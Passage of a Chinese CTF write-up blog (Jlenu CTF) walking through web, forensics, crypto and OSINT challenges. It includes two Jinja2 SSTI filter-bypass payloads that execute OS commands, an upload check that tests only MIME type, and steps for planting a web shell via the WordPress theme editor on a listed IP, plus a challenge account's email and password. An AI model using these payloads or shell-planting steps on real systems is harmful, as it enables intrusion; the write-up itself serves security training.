+<p><img src="https://img-blog.csdnimg.cn/20210522184438512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>测了一下，过滤 <code>.</code> 和<code>[ ]</code></p>
+<p>attr()就行了，多亏了这篇文章，让我又学习了一点SSTI的bypass</p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Chivato/HyWsJ31dI">Jinja2 SSTI Research</a></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config|attr(&#39;__class__&#39;)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;ls&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag: Jlenu{MiaohUB_SO_CUTE!!!!}</p>
+<hr>
+<h1 id="CMS-audit-web"><a href="#CMS-audit-web" class="headerlink" title="CMS_audit(web)"></a>CMS_audit(web)</h1><p>弱密码登录</p>
+<p><img src="https://img-blog.csdnimg.cn/20210522212123629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>漏洞位置：上传LOGO</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">controller\CallAction.class.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upLoad</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;send&#x27;</span>])) &#123;</span><br><span class="line">			<span class="variable">$_logoupload</span> = <span class="keyword">new</span> LogoUpload(<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>]);</span><br><span class="line">			<span class="variable">$_path</span> = <span class="variable">$_logoupload</span>-&gt;getPath();</span><br><span class="line">			<span class="variable">$_img</span> = <span class="keyword">new</span> Image(<span class="variable">$_path</span>);</span><br><span class="line">			<span class="variable">$_img</span>-&gt;xhImg(<span class="number">960</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="variable">$_img</span>-&gt;out();</span><br><span class="line">			<span class="comment">//echo $_path;</span></span><br><span class="line">			<span class="variable">$_logoupload</span>-&gt;alertOpenerClose(<span class="string">&#x27;图片上传成功！&#x27;</span>,<span class="string">&#x27;..&#x27;</span>.<span class="variable">$_path</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>跟进LogoUpload类,看到验证类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//验证类型</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;type,<span class="keyword">$this</span>-&gt;typeArr)) &#123;</span><br><span class="line">			Tool::alertBack(<span class="string">&#x27;警告：不合法的上传类型！&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟进,只判断类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private $typeArr &#x3D; array(&#39;image&#x2F;jpeg&#39;,&#39;image&#x2F;pjpeg&#39;,&#39;image&#x2F;png&#39;,&#39;image&#x2F;x-png&#39;,&#39;image&#x2F;gif&#39;);		&#x2F;&#x2F;类型合集</span><br></pre></td></tr></table></figure>
+
+<p>上传shell<br><img src="https://img-blog.csdnimg.cn/2021052221333721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>flag: Jlenu{GOOD_Y0U_Are_HACKED!!!}</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/12932677.html">YCCMS代码审计(新手教学方向)</a></p>
+<hr>
+<h1 id="warm-up-misc"><a href="#warm-up-misc" class="headerlink" title="warm-up(misc)"></a>warm-up(misc)</h1><p>直接查看源码，发现flag，unicode解码<br><img src="https://img-blog.csdnimg.cn/20210520091213598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>flag: JlenuCTF{Y0u_ArE_HOrse_killER}</p>
+<hr>
+<h1 id="MY-XP-misc"><a href="#MY-XP-misc" class="headerlink" title="MY XP(misc)"></a>MY XP(misc)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;volatility -f 111.vmem imageinfo  &#x2F;&#x2F;imageinfo:查询对应镜像文件的系统信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210521175359434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;volatility -f 111.vmem --profile&#x3D;WinXPSP2x86 psscan  &#x2F;&#x2F;查看进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210521180608939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<blockquote>
+<p>./volatility -f 111.vmem –profile=WinXPSP2x86 filescan |grep -E ‘jpg|png|jpeg|bmp|gif|zip|txt’  //查找文件</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021052118115260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<blockquote>
+<p>./volatility -f 111.vmem –profile=WinXPSP2x86 dumpfiles -Q 0x0000000001d27bf0 –dump-dir=./   //dump文件</p>
+</blockquote>
+<p>打开发现base64，解码即可</p>
+<p><img src="https://img-blog.csdnimg.cn/20210521181258560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>flag: JlenuCTF{You_ArE_F1nd_mY_XPPPP}</p>
+<hr>
+<h1 id="WHATS-HAPPEN-CRYPTO"><a href="#WHATS-HAPPEN-CRYPTO" class="headerlink" title="WHATS HAPPEN?(CRYPTO)"></a>WHATS HAPPEN?(CRYPTO)</h1><p>直接盲文比对</p>
+<p>flag: JlenuCTF{BLINDNEEDHELP}</p>
+<hr>
+<h1 id="SIMPIOT-HAPPYGAME"><a href="#SIMPIOT-HAPPYGAME" class="headerlink" title="SIMPIOT(HAPPYGAME)"></a>SIMPIOT(HAPPYGAME)</h1><p><img src="https://img-blog.csdnimg.cn/20210520092237463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>flag: JlenuCTF{ha-easyy-iOt}</p>
+<hr>
+<hr>
+<h1 id="社工一"><a href="#社工一" class="headerlink" title="社工一"></a>社工一</h1><p>描述：</p>
+<ul>
+<li>魔法少女所维护的网站被黑客攻击了，你是魔法少女请过来的外援大佬，希望你能够帮助魔法少女来进行溯源找到黑客，已知魔法少女对网站进行了备份，加油。 找到后门文件，将黑客id直接提交至平台，无需包装<br>D盾发现后门文件</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210520093704613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>flag: HSYM</p>
+<p>蚁剑连上</p>
+<hr>
+<h1 id="社工二"><a href="#社工二" class="headerlink" title="社工二"></a>社工二</h1><p>描述</p>
+<ul>
+<li>很好，你已经找到了黑客的id，请继续溯源，寻找黑客的代理服务器的ip 将代理服务器ip直接提交</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/2021052209450794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<hr>
+<h1 id="社工三"><a href="#社工三" class="headerlink" title="社工三"></a>社工三</h1><p>描述：</p>
+<ul>
+<li>非常棒，既然你已经找到了黑客的服务器，尝试访问，并找出他的博客后台密码 找出黑客的博客后台密码，直接提交</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210522094730894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>账号：<a href="mailto:&#x53;&#49;&#49;&#52;&#53;&#49;&#52;&#x57;&#64;&#112;&#114;&#x6f;&#x74;&#x6f;&#x6e;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x53;&#49;&#49;&#52;&#53;&#49;&#52;&#x57;&#64;&#112;&#114;&#x6f;&#x74;&#x6f;&#x6e;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a><br>密码：HSYM20020301</p>
+<hr>
+<h1 id="社工四"><a href="#社工四" class="headerlink" title="社工四"></a>社工四</h1><p>描述：</p>
+<ul>
+<li>good，该找的都找得差不多了黑客的邮箱里面可能会有些好东西哦 找出黑客的真实地理位置，地理位置名称提交</li>
+<li>先拿shell，然后找邮箱配置备份文件</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ssw6/p/12668000.html">wordpress getshell总结</a></p>
+<p>进入后台，在外观处写shell<br><img src="https://img-blog.csdnimg.cn/2021052212334876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.15.98.31&#x2F;wp-admin&#x2F;theme-editor.php?file&#x3D;upload.php&amp;theme&#x3D;CorePressWPTheme-main</span><br><span class="line">&#x2F;&#x2F;CorePressWPTheme-main为主题名</span><br><span class="line"></span><br><span class="line">url+&#x2F;wp-content&#x2F;themes&#x2F;+主题名&#x2F;+修改文件的文件名</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑后</p>
+<p><img src="https://img-blog.csdnimg.cn/20210523223843510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>使用密码登录邮箱，看到一张照片，下载下来</p>
+<p><img src="https://img-blog.csdnimg.cn/2021052322482633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>发现GPS</p>
+<p><img src="https://img-blog.csdnimg.cn/20210523224801274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>先转换：</p>
+<p><a target="_blank" rel="noopener" href="http://minigps.net/fc.html">转换地址</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210523231645612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>在查找：</p>
+<p><a target="_blank" rel="noopener" href="http://www.metools.info/learn/location201.html">查找地址</a><br><img src="https://img-blog.csdnimg.cn/20210523231619390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<hr>
+<h1 id="社工五"><a href="#社工五" class="headerlink" title="社工五"></a>社工五</h1><p>描述：</p>
+<ul>
+<li>非常棒，抓到他。 找到黑客的身份证号，直接提交</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210523231106490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/19/pikachu%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD/" rel="prev" title="pikachu 文件包含-上传-下载">
+      <i class="fa fa-chevron-left"></i> pikachu 文件包含-上传-下载
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-login-web"><span class="nav-number">1.</span> <span class="nav-text">easy_login(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BDE-CAT-web"><span class="nav-number">2.</span> <span class="nav-text">BDE_CAT(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Easy-SSRF-web"><span class="nav-number">3.</span> <span class="nav-text">Easy_SSRF(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Strange-SQLI-web"><span class="nav-number">4.</span> <span class="nav-text">Strange_SQLI(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MIAOHUB-web"><span class="nav-number">5.</span> <span class="nav-text">MIAOHUB(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CMS-audit-web"><span class="nav-number">6.</span> <span class="nav-text">CMS_audit(web)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#warm-up-misc"><span class="nav-number">7.</span> <span class="nav-text">warm-up(misc)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MY-XP-misc"><span class="nav-number">8.</span> <span class="nav-text">MY XP(misc)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WHATS-HAPPEN-CRYPTO"><span class="nav-number">9.</span> <span class="nav-text">WHATS HAPPEN?(CRYPTO)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SIMPIOT-HAPPYGAME"><span class="nav-number">10.</span> <span class="nav-text">SIMPIOT(HAPPYGAME)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%B8%80"><span class="nav-number">11.</span> <span class="nav-text">社工一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%BA%8C"><span class="nav-number">12.</span> <span class="nav-text">社工二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%B8%89"><span class="nav-number">13.</span> <span class="nav-text">社工三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E5%9B%9B"><span class="nav-number">14.</span> <span class="nav-text">社工四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E4%BA%94"><span class="nav-number">15.</span> <span class="nav-text">社工五</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="程勇胜"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">程勇胜</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程勇胜</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
